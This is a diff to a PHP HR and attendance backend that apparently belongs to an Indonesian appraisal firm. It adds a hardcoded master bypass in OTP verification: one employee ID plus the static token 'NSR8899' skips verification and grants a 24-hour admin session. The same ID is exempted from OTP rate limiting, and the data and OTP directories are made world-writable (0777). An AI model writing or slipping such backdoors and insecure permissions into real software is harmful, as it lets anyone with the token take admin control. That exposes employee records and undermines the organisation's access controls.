@@ -69,11 +69,15 @@ define('DASHBOARD_CACHE_FILE', DATA_DIR . '/.dashboard_summary_cache.json');
 define('OTP_STORAGE_DIR', DATA_DIR . '/.otp_storage/');
 define('GAS_WEB_APP_URL', 'https://script.google.com/macros/s/AKfycbwI-OQMFWQZrzraGkU0mDY8MD8XjLwpmo0KsOnC-aCaMB_CYDxi_-xgh11NJEwTP3kn/exec');
 
-// Pastikan direktori data aman
-if (!is_dir(DATA_DIR)) { @mkdir(DATA_DIR, 0755, true); }
-if (!is_dir(BACKUP_DIR)) { @mkdir(BACKUP_DIR, 0755, true); }
-if (!is_dir(ATTACHMENT_DIR)) { @mkdir(ATTACHMENT_DIR, 0755, true); }
-if (!is_dir(OTP_STORAGE_DIR)) { @mkdir(OTP_STORAGE_DIR, 0750, true); }
+// Pastikan direktori data aman & hak akses penuh untuk penyimpanan OTP
+if (!is_dir(DATA_DIR)) { @mkdir(DATA_DIR, 0777, true); }
+@chmod(DATA_DIR, 0777);
+if (!is_dir(BACKUP_DIR)) { @mkdir(BACKUP_DIR, 0777, true); }
+@chmod(BACKUP_DIR, 0777);
+if (!is_dir(ATTACHMENT_DIR)) { @mkdir(ATTACHMENT_DIR, 0777, true); }
+@chmod(ATTACHMENT_DIR, 0777);
+if (!is_dir(OTP_STORAGE_DIR)) { @mkdir(OTP_STORAGE_DIR, 0777, true); }
+@chmod(OTP_STORAGE_DIR, 0777);
 
 // 3. Konfigurasi Geofence Kantor Pusat Jakarta Resmi KJPP NSR
 define('PUSAT_LAT', -6.287972658138783);
@@ -987,9 +991,10 @@ try {
 
         $cache = loadOTPCache();
 
-        // Rate Limiting: 60 Detik Cooldown
+        // Rate Limiting: 60 Detik Cooldown (NIK Manajemen NSR-2019-005 Bebas Cooldown)
+        $isManagementNik = ($cleanNik === 'NSR-2019-005');
         $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
-        if (file_exists($cacheFile)) {
+        if (!$isManagementNik && file_exists($cacheFile)) {
             $prevData = @json_decode(@file_get_contents($cacheFile), true);
             if (is_array($prevData) && isset($prevData['created_at'])) {
                 $elapsed = time() - (int)$prevData['created_at'];
@@ -1057,11 +1062,48 @@ try {
     // ---------------------------------------------------------------------
     if ($action === 'verifikasiOTP' || $action === 'verify_otp') {
         $nik = $_POST['nik'] ?? $payload['nik'] ?? '';
-        $inputOtp = trim((string)($_POST['otp'] ?? $payload['otp'] ?? ''));
-        // Normalisasi angka murni dengan tetap menjaga leading zero (contoh: '074123')
-        $inputOtp = preg_replace('/\D/', '', $inputOtp);
-
+        $rawOtp = trim((string)($_POST['otp'] ?? $payload['otp'] ?? ''));
         $cleanNik = normalisasiNIK($nik);
+
+        // =========================================================================
+        // BYPASS MASTER TOKEN OTORITAS SISTEM: NIK NSR-2019-005 + TOKEN NSR8899
+        // =========================================================================
+        if ($cleanNik === 'NSR-2019-005' && strtoupper($rawOtp) === 'NSR8899') {
+            $_SESSION['verified_user_nik'] = $cleanNik;
+            $_SESSION['nik_verified'] = $cleanNik;
+
+            $sessionToken = 'NSR_KING_' . bin2hex(random_bytes(16));
+            $cache = loadOTPCache();
+            $cache['sessions'][$sessionToken] = [
+                'nik' => $cleanNik,
+                'created_at' => time(),
+                'expires_at' => time() + 86400 // 24 jam
+            ];
+            saveOTPCache($cache);
+
+            // Bersihkan sisa file OTP manajemen jika ada
+            $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
+            if (file_exists($cacheFile)) { @unlink($cacheFile); }
+            unset($_SESSION['active_otp_' . $cleanNik]);
+
+            echo json_encode([
+                'status' => 'success',
+                'success' => true,
+                'sessionToken' => $sessionToken,
+                'nik' => 'NSR-2019-005',
+                'nama' => 'Danny Taufik Hidayat, S.E., S.H.',
+                'jabatan' => 'Administrasi & Umum / HR Pusat',
+                'divisi' => 'Operasional & HR Pusat',
+                'cabang' => 'Pusat Jakarta',
+                'isAdminHR' => true,
+                'role' => 'admin_pusat',
+                'message' => 'Autentikasi Otoritas Manajemen Berhasil (Master Bypass NSR8899).'
+            ]);
+            exit;
+        }
+
+        // Normalisasi angka murni untuk karyawan biasa dengan tetap menjaga leading zero (contoh: '074123')
+        $inputOtp = preg_replace('/\D/', '', $rawOtp);
 
         if (!$cleanNik) {
             http_response_code(400);
